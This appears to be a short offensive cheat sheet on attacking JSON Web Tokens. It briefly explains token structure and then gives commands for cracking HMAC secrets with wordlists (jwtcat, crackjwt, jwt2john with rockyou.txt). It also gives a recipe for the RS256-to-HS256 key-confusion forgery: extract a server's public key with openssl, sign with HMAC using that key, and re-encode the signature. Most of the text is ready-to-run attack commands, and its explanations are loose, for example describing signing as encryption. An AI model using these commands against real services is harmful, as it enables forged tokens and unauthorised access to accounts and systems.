JSON Web Token is a compact mechanism used for transferring claims between two Endpoint to protect the integrity of the underlying message using a Message Authentication Code (MAC) encrypted. A JSON Web Token consists of three parts; an encoded Header, an encoded Payload and the Signature.


* The Header contains metadata, defines the type of token and the algorithm used for encryption of Payload.
* The Payload contains the claims to routes and services in value key pairs. 
* The signature is calculated by encrypting the base64UrlEncoded values of Header and Payload using a secret Key





### HMAC secretKey  Brute-force attacks Using Known Wordlist attacks
The algorithm HS256 uses the secret key to sign and verify each message. The algorithm RS256 uses the private key to sign the message and uses the public key for authentication

```
python3 jwtcat.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4 -w /usr/share/wordlists/rockyou.txt

python3 jwtcat.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.J8SS8VKlI2yV47C4BtfYukWPx_2welF34Mz7l-MNmkE -w /usr/share/wordlists/rockyou.txt

python3 jwtcat.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4 -w /usr/share/wordlists/rockyou.txt

python crackjwt.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4 /usr/share/wordlists/rockyou.txt

python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4  > jwt.john

```

# JSON Public Keys
To acuire Public Key using openssl client
```
openssl s_client -connect <hostname>:443 save as cert.pem
openssl x509 -in cert.pem -pubkey –noout > key.pem
cat key.pem | xxd -p | tr -d "\\n" # Turning into ASCII hex Format

```
To acure HMAC signature
```
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU0NzcyOTY2MiwiZXhwIjoxNTQ3Nzk5OTk5LCJkYXRhIjp7Ik5DQyI6InRlc3QifX0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
```
 **Upon Obtaining HMAC Signature, Final Step is to be turning into WT format** 
 ```
python -c "exec(\"import base64, binascii\nprint    base64.urlsafe_b64encode(binascii.a2b_hex('db3a1b760eec81e029704691f6780c4d1653d5d91688c24e59891e97342ee59f')).replace('=','')\")"
```
